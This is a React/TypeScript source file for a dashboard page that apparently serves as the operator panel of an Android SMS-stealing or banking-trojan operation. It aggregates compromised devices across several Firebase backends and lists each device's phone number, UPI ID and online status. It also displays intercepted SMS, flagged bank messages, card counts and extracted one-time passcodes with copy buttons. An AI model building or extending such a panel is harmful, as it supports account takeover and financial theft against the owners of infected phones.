import { useEffect, useState } from "react";
import { Layout } from "@/components/layout";
import {
  Database,
  Server,
  Smartphone,
  MessageSquare,
  KeyRound,
  RefreshCw,
  Loader2,
  Signal,
  WifiOff,
  Landmark,
  CreditCard,
  Globe,
  Copy,
  CheckCircle2,
  AlertTriangle,
  ShieldCheck,
  Code2,
} from "lucide-react";
import { authHeaders } from "@/lib/apiFetch";
import { firebaseConfig } from "@/lib/firebaseConfig";

const API = `${import.meta.env.VITE_API_URL ?? ""}/api`;

interface Stats {
  devices: number;
  online: number;
  offline: number;
  sms: number;
  otps: number;
  bankSms: number;
  cards: number;
}
interface Instance {
  id: string;
  name: string;
  databaseURL: string;
  primary?: boolean;
  enabled?: boolean;
  stats?: Stats;
  error?: string;
}
interface Overview {
  totals: Stats;
  instances: Instance[];
}

interface DeviceRow {
  id: string;
  model: string;
  phone: string;
  upi: string;
  network: string;
  androidV: string;
  battery: string;
  online: boolean;
}
interface SmsRow {
  deviceId: string;
  deviceModel: string;
  devicePhone: string;
  from: string;
  body: string;
  date: number;
  bank: boolean;
}
interface OtpRow {
  code: string;
  service: string;
  number: string;
  from: string;
  body: string;
  deviceId: string;
  date: number;
}

const API_BASE = API;

async function get<T>(path: string): Promise<T> {
  const res = await fetch(`${API_BASE}${path}`, {
    headers: authHeaders() as any,
  });
  if (!res.ok) throw new Error(`HTTP ${res.status}`);
  return res.json();
}

function StatCell({
  label,
  value,
  icon,
  accent,
}: {
  label: string;
  value: number;
  icon: any;
  accent: string;
}) {
  const Icon = icon;
  return (
    <div className="relative overflow-hidden rounded-2xl border border-card-border bg-card/70 backdrop-blur p-3 flex items-center gap-3">
      <div
        className={`flex items-center justify-center w-9 h-9 rounded-xl bg-gradient-to-br ${accent}`}
      >
        <Icon className="w-4 h-4" />
      </div>
      <div className="flex flex-col leading-tight">
        <span className="page-eyebrow">{label}</span>
        <span className="font-mono text-xl font-bold tabular-nums text-foreground">
          {value}
        </span>
      </div>
    </div>
  );
}

export function Firebases() {
  const [overview, setOverview] = useState<Overview | null>(null);
  const [loading, setLoading] = useState(true);
  const [activeId, setActiveId] = useState<string>("primary");
  const [tab, setTab] = useState<"devices" | "sms" | "otps" | "config">("devices");
  const [devices, setDevices] = useState<DeviceRow[]>([]);
  const [sms, setSms] = useState<SmsRow[]>([]);
  const [otps, setOtps] = useState<OtpRow[]>([]);
  const [busy, setBusy] = useState(false);
  const [copied, setCopied] = useState<string | null>(null);
  const [testResult, setTestResult] = useState<{ ok: boolean; message: string } | null>(null);
  const [testing, setTesting] = useState(false);

  const refreshOverview = async () => {
    try {
      const d = await get<Overview>("/overview");
      setOverview(d);
      setLoading(false);
      if (!d.instances.some((i) => i.id === activeId)) {
        setActiveId(d.instances[0]?.id || "primary");
      }
    } catch {
      setLoading(false);
    }
  };

  useEffect(() => {
    refreshOverview();
    const t = setInterval(refreshOverview, 15000);
    return () => clearInterval(t);
  }, []);

  useEffect(() => {
    if (!activeId) return;
    let alive = true;
    setBusy(true);
    (async () => {
      try {
        const [d, s, o] = await Promise.all([
          get<{ devices: DeviceRow[] }>(`/firebases/${activeId}/status`),
          get<{ sms: SmsRow[] }>(`/firebases/${activeId}/sms?limit=60`),
          get<{ otps: OtpRow[] }>(`/firebases/${activeId}/otps?limit=30`),
        ]);
        if (!alive) return;
        setDevices(d.devices || []);
        setSms(s.sms || []);
        setOtps(o.otps || []);
      } catch {
        /* instance may be down */
      } finally {
        if (alive) setBusy(false);
      }
    })();
    return () => {
      alive = false;
    };
  }, [activeId]);

  const copyText = async (text: string, key: string) => {
    await navigator.clipboard.writeText(text);
    setCopied(key);
    setTimeout(() => setCopied(null), 1200);
  };

  const active = overview?.instances.find((i) => i.id === activeId);
  const stats = active?.stats;

  return (
    <Layout>
      <div className="mb-6">
        <p className="page-eyebrow flex items-center gap-2">
          <Database className="w-3 h-3 text-primary" /> Backend
        </p>
        <h1 className="page-title text-3xl md:text-4xl">
          <span className="text-primary">Firebases</span>
        </h1>
        <p className="text-sm text-muted-foreground mt-1.5 flex items-center gap-2">
          <span className="inline-flex items-center gap-1.5">
            <span className="w-1.5 h-1.5 rounded-full bg-success animate-pulse shadow-[0_0_8px_2px] shadow-success/50" />
            {overview?.totals.online ?? 0} online across{" "}
            {overview?.instances.length ?? 0} instances
          </span>
          <span className="opacity-40">·</span>
          <span>{overview?.totals.devices ?? 0} devices total</span>
        </p>
      </div>

      {/* ── Full-backend totals ── */}
      {overview && (
        <div className="grid grid-cols-2 md:grid-cols-4 xl:grid-cols-7 gap-3 mb-6">
          <StatCell
            label="Devices"
            value={overview.totals.devices}
            icon={Smartphone}
            accent="from-primary/20 to-primary/5 text-primary"
          />
          <StatCell
            label="Online"
            value={overview.totals.online}
            icon={Signal}
            accent="from-success/20 to-success/5 text-success"
          />
          <StatCell
            label="Offline"
            value={overview.totals.offline}
            icon={WifiOff}
            accent="from-muted-foreground/15 to-muted-foreground/5 text-muted-foreground"
          />
          <StatCell
            label="SMS"
            value={overview.totals.sms}
            icon={MessageSquare}
            accent="from-accent/20 to-accent/5 text-accent"
          />
          <StatCell
            label="OTPs"
            value={overview.totals.otps}
            icon={KeyRound}
            accent="from-warning/20 to-warning/5 text-warning"
          />
          <StatCell
            label="Bank SMS"
            value={overview.totals.bankSms}
            icon={Landmark}
            accent="from-amber-500/20 to-amber-500/5 text-amber-400"
          />
          <StatCell
            label="Cards"
            value={overview.totals.cards}
            icon={CreditCard}
            accent="from-rose-500/20 to-rose-500/5 text-rose-400"
          />
        </div>
      )}

      {/* ── Instance tabs ── */}
      <div className="flex flex-wrap items-center gap-2 mb-4">
        {(overview?.instances || []).map((inst) => (
          <button
            key={inst.id}
            onClick={() => setActiveId(inst.id)}
            className={`inline-flex items-center gap-2 px-3.5 py-2 rounded-xl border text-xs font-bold transition-all ${
              activeId === inst.id
                ? "border-primary/60 bg-primary/10 text-primary ring-1 ring-primary/30"
                : "border-card-border bg-card/70 text-muted-foreground hover:text-foreground"
            }`}
            title={inst.databaseURL}
          >
            <span
              className={`w-2 h-2 rounded-full ${inst.error ? "bg-destructive" : inst.stats && inst.stats.online > 0 ? "bg-success animate-pulse" : "bg-muted-foreground"}`}
            />
            {inst.name}
            {inst.primary && (
              <span className="text-[9px] font-mono opacity-60">PRIMARY</span>
            )}
            {inst.error && (
              <AlertTriangle className="w-3 h-3 text-destructive" />
            )}
            {inst.stats && (
              <span className="font-mono text-[9px] opacity-70">
                {inst.stats.devices}
              </span>
            )}
          </button>
        ))}
        <button
          onClick={refreshOverview}
          className="inline-flex items-center gap-2 px-3 py-2 rounded-xl border border-card-border bg-card/70 text-xs font-bold text-muted-foreground hover:text-foreground transition-colors"
        >
          <RefreshCw className={`w-3.5 h-3.5 ${busy ? "animate-spin" : ""}`} />{" "}
          Refresh
        </button>
      </div>

      {/* ── Active instance ── */}
      {active ? (
        <div className="relative overflow-hidden rounded-2xl border border-card-border bg-card/70 backdrop-blur p-5 mb-5">
          <span className="absolute -top-14 -right-14 w-40 h-40 rounded-full bg-primary/10 blur-3xl pointer-events-none" />
          <div className="relative flex flex-wrap items-center gap-3 justify-between mb-4">
            <div className="flex items-center gap-3 min-w-0">
              <div className="flex items-center justify-center w-10 h-10 rounded-xl bg-gradient-to-br from-primary/20 to-accent/10 text-primary ring-1 ring-primary/20">
                <Server className="w-5 h-5" />
              </div>
              <div className="min-w-0">
                <h2 className="font-display font-semibold">{active.name}</h2>
                <p
                  className="font-mono text-[10px] text-muted-foreground truncate max-w-[16rem]"
                  title={active.databaseURL}
                >
                  {active.databaseURL}
                </p>
              </div>
            </div>
            <button
              onClick={() => copyText(active.databaseURL, "url")}
              className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg border border-card-border text-[11px] font-bold text-muted-foreground hover:text-primary transition-colors"
            >
              {copied === "url" ? (
                <CheckCircle2 className="w-3 h-3 text-success" />
              ) : (
                <Copy className="w-3 h-3" />
              )}
              {copied === "url" ? "Copied" : "Copy URL"}
            </button>
          </div>

          {active.error ? (
            <div className="text-sm text-destructive bg-destructive/5 border border-destructive/20 rounded-xl p-4 flex items-center gap-2">
              <AlertTriangle className="w-4 h-4" /> Instance unreachable:{" "}
              {active.error}
            </div>
          ) : (
            <>
              <div className="grid grid-cols-2 md:grid-cols-4 xl:grid-cols-7 gap-2.5 mb-5">
                <StatCell
                  label="Devices"
                  value={stats?.devices ?? 0}
                  icon={Smartphone}
                  accent="from-primary/20 to-primary/5 text-primary"
                />
                <StatCell
                  label="Online"
                  value={stats?.online ?? 0}
                  icon={Signal}
                  accent="from-success/20 to-success/5 text-success"
                />
                <StatCell
                  label="Offline"
                  value={stats?.offline ?? 0}
                  icon={WifiOff}
                  accent="from-muted-foreground/15 to-muted-foreground/5 text-muted-foreground"
                />
                <StatCell
                  label="SMS"
                  value={stats?.sms ?? 0}
                  icon={MessageSquare}
                  accent="from-accent/20 to-accent/5 text-accent"
                />
                <StatCell
                  label="OTPs"
                  value={stats?.otps ?? 0}
                  icon={KeyRound}
                  accent="from-warning/20 to-warning/5 text-warning"
                />
                <StatCell
                  label="Bank SMS"
                  value={stats?.bankSms ?? 0}
                  icon={Landmark}
                  accent="from-amber-500/20 to-amber-500/5 text-amber-400"
                />
                <StatCell
                  label="Cards"
                  value={stats?.cards ?? 0}
                  icon={CreditCard}
                  accent="from-rose-500/20 to-rose-500/5 text-rose-400"
                />
              </div>

              <div className="flex gap-1 p-1 rounded-xl border border-card-border bg-card/70 w-fit mb-4">
                {(
                  [
                    ["devices", "Devices", Smartphone],
                    ["sms", "SMS", MessageSquare],
                    ["otps", "OTPs", KeyRound],
                    ["config", "Firebase Config", ShieldCheck],
                  ] as const
                ).map(([key, label, Icon]) => (
                  <button
                    key={key}
                    onClick={() => setTab(key)}
                    className={`inline-flex items-center gap-1.5 px-3.5 py-2 rounded-lg text-xs font-bold transition-all ${
                      tab === key
                        ? "bg-primary text-primary-foreground shadow-md shadow-primary/25"
                        : "text-muted-foreground hover:text-foreground"
                    }`}
                  >
                    <Icon className="w-3.5 h-3.5" /> {label}
                  </button>
                ))}
              </div>

              {busy && (
                <div className="flex items-center gap-2 text-xs text-muted-foreground mb-3">
                  <Loader2 className="w-3.5 h-3.5 animate-spin" /> Loading
                  instance data…
                </div>
              )}

              {tab === "devices" && (
                <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-3">
                  {devices.map((d) => (
                    <div
                      key={d.id}
                      className="rounded-2xl border border-card-border bg-card/60 p-4"
                    >
                      <div className="flex items-start justify-between gap-2 mb-2">
                        <div className="min-w-0">
                          <p className="font-display font-semibold text-sm truncate">
                            {d.model}
                          </p>
                          <p className="font-mono text-[10px] text-muted-foreground truncate">
                            {d.id.slice(0, 16)}
                          </p>
                        </div>
                        <span
                          className={`inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[10px] font-bold ${d.online ? "bg-success/10 text-success" : "bg-muted/60 text-muted-foreground"}`}
                        >
                          <span
                            className={`w-1.5 h-1.5 rounded-full ${d.online ? "bg-success animate-pulse" : "bg-muted-foreground"}`}
                          />
                          {d.online ? "Online" : "Offline"}
                        </span>
                      </div>
                      <div className="grid grid-cols-2 gap-y-1.5 text-xs">
                        <span className="page-eyebrow">Number</span>
                        <span className="font-mono font-semibold text-xs truncate">
                          {d.phone || "—"}
                        </span>
                        <span className="page-eyebrow">Network</span>
                        <span className="font-mono text-xs text-muted-foreground truncate">
                          {d.network || "—"}
                        </span>
                        <span className="page-eyebrow">Android</span>
                        <span className="font-mono text-xs">
                          {d.androidV ? `v${d.androidV}` : "—"}
                        </span>
                        <span className="page-eyebrow">Battery</span>
                        <span className="font-mono text-xs">
                          {d.battery || "—"}
                        </span>
                      </div>
                      {d.upi && (
                        <p className="mt-2 font-mono text-[10px] text-primary truncate">
                          UPI: {d.upi}
                        </p>
                      )}
                    </div>
                  ))}
                  {devices.length === 0 && !busy && (
                    <p className="text-sm text-muted-foreground col-span-full py-6 text-center">
                      No devices on this instance.
                    </p>
                  )}
                </div>
              )}

              {tab === "sms" && (
                <div className="space-y-2 max-h-[480px] overflow-y-auto pr-1">
                  {sms.map((s, i) => (
                    <div
                      key={i}
                      className={`rounded-xl border p-3 ${s.bank ? "border-warning/30 bg-warning/5" : "border-card-border bg-card/60"}`}
                    >
                      <div className="flex items-center justify-between gap-2 mb-1.5">
                        <div className="flex items-center gap-2 min-w-0">
                          <span
                            className={`text-[11px] font-bold px-2 py-0.5 rounded-full truncate max-w-[45%] ${s.bank ? "bg-warning/15 text-warning" : "bg-primary/10 text-primary"}`}
                          >
                            {s.from}
                          </span>
                          {s.bank && (
                            <Landmark className="w-3 h-3 text-warning shrink-0" />
                          )}
                        </div>
                        <div className="flex items-center gap-2 shrink-0">
                          <span className="font-mono text-[10px] text-muted-foreground">
                            {s.deviceModel}
                          </span>
                          <span className="font-mono text-[10px] text-muted-foreground/70">
                            {new Date(s.date).toLocaleTimeString()}
                          </span>
                        </div>
                      </div>
                      <p className="text-xs text-foreground/90 break-words">
                        {s.body}
                      </p>
                    </div>
                  ))}
                  {sms.length === 0 && !busy && (
                    <p className="text-sm text-muted-foreground py-6 text-center">
                      No SMS on this instance.
                    </p>
                  )}
                </div>
              )}

              {tab === "otps" && (
                <div className="space-y-2 max-h-[480px] overflow-y-auto pr-1">
                  {otps.map((o, i) => (
                    <div
                      key={i}
                      className="rounded-xl border border-card-border bg-card/60 p-3 flex items-center gap-3"
                    >
                      <button
                        onClick={() => copyText(o.code, `otp-${i}`)}
                        className="font-mono text-sm font-bold text-primary bg-primary/10 border border-primary/20 px-2.5 py-1 rounded-lg hover:bg-primary/20 transition-colors shrink-0"
                        title="Copy code"
                      >
                        {o.code}
                      </button>
                      <div className="min-w-0 flex-1">
                        <p className="text-xs font-bold text-foreground truncate">
                          {o.service || o.from || "Unknown"}
                        </p>
                        <p className="font-mono text-[10px] text-muted-foreground truncate">
                          {o.number || o.deviceId || ""}
                        </p>
                      </div>
                      <span className="font-mono text-[10px] text-muted-foreground/70 shrink-0">
                        {new Date(o.date).toLocaleString()}
                      </span>
                    </div>
                  ))}
                  {otps.length === 0 && !busy && (
                    <p className="text-sm text-muted-foreground py-6 text-center">
                      No OTPs on this instance.
                    </p>
                  )}
                </div>
              )}

              {tab === "config" && (
                <div className="space-y-4">
                  <div className="rounded-2xl border border-card-border bg-card/60 p-5">
                    <div className="flex flex-wrap items-center justify-between gap-3 mb-4">
                      <div>
                        <h3 className="text-sm font-semibold text-foreground flex items-center gap-2">
                          <ShieldCheck className="w-4 h-4 text-primary" /> Active Firebase Config
                        </h3>
                        <p className="text-xs text-muted-foreground">
                          Target Project: <span className="font-mono text-foreground font-medium">{firebaseConfig.projectId}</span> · Storage: <span className="font-mono text-foreground">{firebaseConfig.storageBucket}</span>
                        </p>
                      </div>
                      <div className="flex items-center gap-2">
                        <button
                          onClick={() => {
                            const snippet = `const firebaseConfig = ${JSON.stringify(firebaseConfig, null, 2)};`;
                            copyText(snippet, "all-config");
                          }}
                          className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg border border-card-border text-xs font-semibold text-muted-foreground hover:text-primary transition-colors"
                        >
                          {copied === "all-config" ? (
                            <CheckCircle2 className="w-3.5 h-3.5 text-success" />
                          ) : (
                            <Copy className="w-3.5 h-3.5" />
                          )}
                          {copied === "all-config" ? "Copied" : "Copy JSON"}
                        </button>
                      </div>
                    </div>

                    <div className="grid grid-cols-1 md:grid-cols-2 gap-3 mb-4">
                      {[
                        { label: "apiKey", val: firebaseConfig.apiKey },
                        { label: "authDomain", val: firebaseConfig.authDomain },
                        { label: "databaseURL", val: active?.databaseURL || firebaseConfig.databaseURL },
                        { label: "projectId", val: firebaseConfig.projectId },
                        { label: "storageBucket", val: firebaseConfig.storageBucket },
                        { label: "messagingSenderId", val: firebaseConfig.messagingSenderId },
                        { label: "appId", val: firebaseConfig.appId },
                      ].map((item) => (
                        <div key={item.label} className="p-3 rounded-xl border border-card-border bg-card/40 flex items-center justify-between gap-2">
                          <div className="min-w-0">
                            <span className="text-[10px] font-mono text-muted-foreground uppercase">{item.label}</span>
                            <p className="font-mono text-xs text-foreground truncate select-all">{item.val}</p>
                          </div>
                          <button
                            onClick={() => copyText(item.val, item.label)}
                            className="p-1.5 rounded-lg text-muted-foreground hover:text-primary transition-colors shrink-0"
                            title={`Copy ${item.label}`}
                          >
                            {copied === item.label ? (
                              <CheckCircle2 className="w-3.5 h-3.5 text-success" />
                            ) : (
                              <Copy className="w-3.5 h-3.5" />
                            )}
                          </button>
                        </div>
                      ))}
                    </div>

                    <div className="p-3.5 rounded-xl bg-muted/50 border border-card-border">
                      <div className="flex items-center justify-between mb-2">
                        <span className="text-[11px] font-mono text-muted-foreground flex items-center gap-1.5">
                          <Code2 className="w-3.5 h-3.5" /> JavaScript Initialization Snippet
                        </span>
                      </div>
                      <pre className="text-[11px] font-mono text-muted-foreground overflow-x-auto p-3 rounded bg-background/50 leading-relaxed">
{`const firebaseConfig = {
  apiKey: "${firebaseConfig.apiKey}",
  authDomain: "${firebaseConfig.authDomain}",
  databaseURL: "${firebaseConfig.databaseURL}",
  projectId: "${firebaseConfig.projectId}",
  storageBucket: "${firebaseConfig.storageBucket}",
  messagingSenderId: "${firebaseConfig.messagingSenderId}",
  appId: "${firebaseConfig.appId}",
};`}
                      </pre>
                    </div>
                  </div>
                </div>
              )}
            </>
          )}
        </div>
      ) : (
        <p className="text-sm text-muted-foreground py-6 text-center">
          <Globe className="w-5 h-5 inline mr-2" />
          {loading ? "Loading backend overview…" : "No instances configured."}
        </p>
      )}
    </Layout>
  );
}
